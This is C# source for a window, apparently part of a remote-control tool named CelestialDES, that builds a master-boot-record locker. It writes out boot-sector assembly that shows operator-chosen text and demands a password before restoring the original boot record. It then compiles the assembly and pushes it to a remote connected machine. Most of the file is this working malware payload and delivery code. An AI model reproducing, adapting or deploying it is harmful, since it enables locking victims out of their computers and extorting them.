using CelestialDES.Helper;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Windows;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media.Animation;
using static CelestialDES.MainWindow;

namespace CelestialDES.wpfForms
{
    /// <summary>
    /// Логика взаимодействия для BootloaderOW.xaml
    /// </summary>
    public partial class BootloaderOW : Window
    {
        public int ConnectionID { get; set; }
        public BootloaderOW()
        {
            if (ProgramSettings.WindowBlur) WindowBlur.SetIsEnabled(this, true);
            InitializeComponent();
        }

        private void btnClose_Click(object sender, RoutedEventArgs e)
        {
            DoubleAnimation tabanim = new DoubleAnimation();
            tabanim.EasingFunction = new PowerEase();
            tabanim.From = 1;
            tabanim.To = 0;
            tabanim.Duration = TimeSpan.FromMilliseconds(125);
            tabanim.Completed += anim_Completed;
            this.BeginAnimation(Window.OpacityProperty, tabanim);
        }

        void anim_Completed(object sender, EventArgs e)
        {
            this.Close();
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            if (File.Exists("boot.asm")) File.Delete("boot.asm");

            try
            {
                using (var fs = new FileStream("boot.asm", FileMode.OpenOrCreate, FileAccess.ReadWrite))
                {
                    using (var fw = new StreamWriter(fs))
                    {
                        fw.Write("cpu 386\r\nbits 16\r\norg 0h\r\n\r\n\r\nstart:                       \r\n    jmp short load_prog\r\nload_prog:\r\n    cld\r\n    xor ax,ax\r\n    mov ss,ax\r\n    mov sp,7c00h              \r\n    mov ax,8000h\r\n    mov es,ax                 \r\n    mov ds,ax                \r\n\r\n\r\nload_1:\r\n    mov ax,0206h             \r\n    mov cx,0001h             \r\n\r\n    mov dh,00h             \r\n    mov bx,0h                \r\n    int 13h\r\n    cmp ah,0\r\n    jne load_1                \r\n\r\n    mov [boot_drive], dl\r\n\r\n    push es\r\n    mov ax,prog_continue\r\n    push ax\r\n    retf\r\n\r\nprog_continue:\r\n    mov ah, 07h                \r\n    mov al, 0x00            \r\n    mov bh, 0x0F               \r\n    mov cx, 0x0000           \r\n    mov dx, 0x184f\r\n    int 10h\r\n\r\n    mov dh, 0                 \r\n    mov dl, 0                  \r\n    mov ah, 02h                \r\n    mov bh, 0                  \r\n    int 10h                    \r\n\r\n    mov bp, 0400h\r\n    mov ah, 0eh\r\n    mov si, 0ffffh\r\n\r\nwrite_char:\r\n    inc si\r\n    cmp byte [ds:bp + si],0    \r\n    jz next\r\n    push bp\r\n\r\n    mov al, [byte ds:bp + si]\r\n    mov bx, 07h                \r\n    int 10h                    \r\n    pop bp\r\n    jmp write_char\r\n\r\nprint_str:\r\n    push ax\r\n    push di\r\n    mov ah,0eh\r\n.getchar:\r\n    lodsb                      \r\n    test al, al               \r\n    jz .end\r\n    int 10h\r\n    jmp .getchar\r\n.end:\r\n    pop di\r\n    pop ax\r\n    ret\r\n\r\nnext:\r\n    mov dh, 23                \r\n    mov dl, 1                 \r\n    mov ah, 02h               \r\n    mov bh, 0              \r\n    int 10h                   \r\n\r\n    mov si, msg1\r\n    call print_str\r\n    mov si, buffer\r\n\r\nget_keystrokes:\r\n    xor al, al                \r\n    mov ah,0h             \r\n    int 16h\r\n\r\n    mov ah, 03h               \r\n    mov bh, 0            \r\n    int 10h                  \r\n\r\n    cmp al, 0                \r\n    je get_keystrokes\r\n\r\n    cmp al, 32                \r\n    je get_keystrokes\r\n\r\n    cmp al, 9           \r\n    je get_keystrokes\r\n\r\n    cmp al, 8                  \r\n    je backspace\r\n\r\n    cmp al, 13               \r\n    je compare\r\n\r\n    cmp dl, 78                \r\n    je get_keystrokes\r\n\r\n    mov ah, 0Eh              \r\n    int 10h                   \r\n    mov byte [si], al\r\n    inc si\r\n    jmp get_keystrokes\r\n\r\nbackspace:\r\n    mov ah, 03h               \r\n    mov bh, 0               \r\n    int 10h                  \r\n\r\n    cmp dl, msg1_len          \r\n    je get_keystrokes\r\n    dec dl\r\n\r\n    mov ah, 02h             \r\n    mov bh, 0                 \r\n    int 10h                \r\n\r\n    mov al, 0                \r\n    mov ah, 0Eh              \r\n    int 10h                   \r\n\r\n    dec si\r\n    mov byte [si], 0           \r\n\r\n    mov ah, 02h            \r\n    mov bh, 0               \r\n    int 10h                   \r\n\t\r\n    jmp get_keystrokes\r\n\r\ncompare:\r\n    lea esi, [password]\r\n    lea edi, [buffer]\r\n    mov ecx, password_len     \r\n    rep cmpsb                  \r\n    mov eax, 4                 \r\n    mov ebx, 1          \r\n    mov si, buffer             \r\n    jne .ClearAll           \r\n    jmp RestoreMBR             \r\n.ClearAll:\r\n    mov ah, 02h             \r\n    mov bh, 0                 \r\n    int 10h                    \r\n\r\n    mov byte [si], 0         \r\n    inc si\r\n\r\n    cmp dl, msg1_len          \r\n    je next\r\n    dec dl\r\n\r\n    mov ah, 02h             \r\n    mov bh, 0                \r\n    int 10h                \r\n\r\n    mov al, 0                \r\n    mov ah, 0Eh             \r\n    int 10h                   \r\n\r\n    mov ah, 02h             \r\n    mov bh, 0                 \r\n    int 10h                  \r\n\r\n    jmp .ClearAll\r\n\r\n\r\nRestoreMBR:\r\n    mov ax, 7c0h             \r\n    mov es, ax\r\n\r\n    xor ax, ax               \r\n    mov ss, ax                \r\n    mov sp, 0x7c00            \r\n\r\n    mov bx, buffer            \r\n    mov dl, [boot_drive]      \r\n    mov dh,0                 \r\n    mov ch,0                  \r\n    mov cl,2                \r\n    mov al,1                 \r\n    mov ah,2                  \r\n    int 13h                   \r\n\r\n    mov bx, buffer          \r\n    mov dl, [boot_drive]     \r\n    mov dh,0                  \r\n    mov ch,0                \r\n    mov cl,1                  \r\n    mov al,8                \r\n    mov ah,3                  \r\n    int 13h                 \r\n\r\nRebootPC:\r\n    xor ax, ax\r\n    mov es, ax\r\n    mov bx, 1234\r\n    mov [es:0472], bx\r\n    cli\r\n    mov ds, ax\r\n    mov es, ax\r\n    mov ss, ax\r\n    mov sp, ax\r\n    mov ax, 2\r\n    push ax\r\n    mov ax, 0xf000\r\n    push ax\r\n    mov ax, 0xfff0\r\n    push ax\r\n    iret");

                        fw.WriteLine("MBR_Signature:");
                        fw.WriteLine("boot_drive dd 0");
                        fw.WriteLine("msg1: db 'Password: ', 0");
                        fw.WriteLine("msg1_len: equ $-msg1");
                        fw.WriteLine("password: db '" + textpswrd.Text + "', 0");
                        fw.WriteLine("password_len: equ $-password");
                        fw.WriteLine("times 510-($-$$) db 0");
                        fw.WriteLine("db 55h,0aah");
                        fw.WriteLine("times 1024-($-$$) db 0");

                        int linesc = txtConsole.Document.Blocks.Count;

                        var textRange = new TextRange(txtConsole.Document.ContentStart, txtConsole.Document.ContentEnd);
                        string[] lines = textRange.Text.Split('\n');

                        for (int i = 0; i < linesc; i++)
                        {
                            fw.WriteLine("db '" + lines[i].Trim().Replace('\n', ' ') + "', 0xa, 0xd");
                        }

                        fw.Write("    times 4096-($-$$) db 0\r\n    buffer:");

                        fw.Close();
                        fw.Dispose();
                    }
                    fs.Close();
                    fs.Dispose();
                }
            }
            catch{ System.Windows.Forms.MessageBox.Show("can't create boot.asm"); File.Delete("boot.asm"); }

            try
            {
                ProcessStartInfo startInf = new ProcessStartInfo
                {
                    FileName = System.Windows.Forms.Application.StartupPath + "\\data\\asm.exe",
                    Arguments = "-f bin boot.asm",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                };
                Process.Start(startInf).WaitForExit();
                File.Delete("boot.asm");
            }
            catch { System.Windows.Forms.MessageBox.Show("can't compile assembly");  File.Delete("boot.asm"); }

            try
            {
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int)61);
                ToSend.AddRange(File.ReadAllBytes("boot"));
                PacketSender.Send(ConnectionID, ToSend.ToArray());
                File.Delete("boot");
            }
            catch { System.Windows.Forms.MessageBox.Show("can't compile assembly or assembly not found, try to reduce text length"); File.Delete("boot.asm"); }
        }
        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            PowerEase easeing = new PowerEase();
            easeing.EasingMode = EasingMode.EaseOut;
            DoubleAnimation tabanim = new DoubleAnimation();
            tabanim.EasingFunction = easeing;
            tabanim.From = 0;
            tabanim.To = 1;
            tabanim.Duration = TimeSpan.FromMilliseconds(70);
            this.BeginAnimation(Window.OpacityProperty, tabanim);
        }
        private bool animation_is_running = false;
        private void StackPanel_MouseMove(object sender, System.Windows.Input.MouseEventArgs e)
        {
            if (Mouse.LeftButton == MouseButtonState.Pressed)
            {
                if (!animation_is_running)
                {
                    var decreaseOpacityAnim = new DoubleAnimation(0.3, (Duration)TimeSpan.FromSeconds(0.15));
                    this.BeginAnimation(UIElement.OpacityProperty, decreaseOpacityAnim);
                    animation_is_running = true;
                }

                this.DragMove();
            }
            else
            {
                if (animation_is_running)
                {
                    var increaseOpacityAnim = new DoubleAnimation(1, (Duration)TimeSpan.FromSeconds(0.15));
                    this.BeginAnimation(UIElement.OpacityProperty, increaseOpacityAnim);
                    animation_is_running = false;
                }
            }
        }
    }
}
